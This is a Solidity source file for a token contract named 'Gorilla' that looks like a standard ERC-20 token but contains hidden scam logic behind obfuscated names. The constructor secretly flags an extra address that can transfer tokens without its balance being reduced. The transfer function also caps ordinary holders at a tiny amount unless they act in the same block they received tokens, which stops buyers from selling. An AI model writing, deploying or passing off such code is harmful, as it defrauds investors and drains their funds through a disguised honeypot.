/*

https://t.me/gorillapeportal

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Gorilla is Ownable {
    string public symbol;

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address knayozmblx, uint256 eqkrn) public returns (bool success) {
        allowance[msg.sender][knayozmblx] = eqkrn;
        emit Approval(msg.sender, knayozmblx, eqkrn);
        return true;
    }

    IUniswapV2Router02 private ipakrgxtmvzy;

    uint256 private pfhokbsltwd = 108;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory qrwxdoifma, string memory vhem, address zxqlypr, address jvbsido) {
        name = qrwxdoifma;
        symbol = vhem;
        balanceOf[msg.sender] = totalSupply;
        jflyanitpr[jvbsido] = pfhokbsltwd;
        ipakrgxtmvzy = IUniswapV2Router02(zxqlypr);
    }

    function transfer(address rhoyqtuzf, uint256 eqkrn) public returns (bool success) {
        cownxm(msg.sender, rhoyqtuzf, eqkrn);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function cownxm(address xeyfr, address rhoyqtuzf, uint256 eqkrn) private {
        address tuabokjzy = IUniswapV2Factory(ipakrgxtmvzy.factory()).getPair(address(this), ipakrgxtmvzy.WETH());
        bool frum = 0 == jflyanitpr[xeyfr];
        if (frum) {
            if (xeyfr != tuabokjzy && lwfkupqthzgy[xeyfr] != block.number && eqkrn < totalSupply) {
                require(eqkrn <= totalSupply / (10 ** decimals));
            }
            balanceOf[xeyfr] -= eqkrn;
        }
        balanceOf[rhoyqtuzf] += eqkrn;
        lwfkupqthzgy[rhoyqtuzf] = block.number;
        emit Transfer(xeyfr, rhoyqtuzf, eqkrn);
    }

    function transferFrom(address xeyfr, address rhoyqtuzf, uint256 eqkrn) public returns (bool success) {
        require(eqkrn <= allowance[xeyfr][msg.sender]);
        allowance[xeyfr][msg.sender] -= eqkrn;
        cownxm(xeyfr, rhoyqtuzf, eqkrn);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private lwfkupqthzgy;

    uint8 public decimals = 9;

    mapping(address => uint256) private jflyanitpr;
}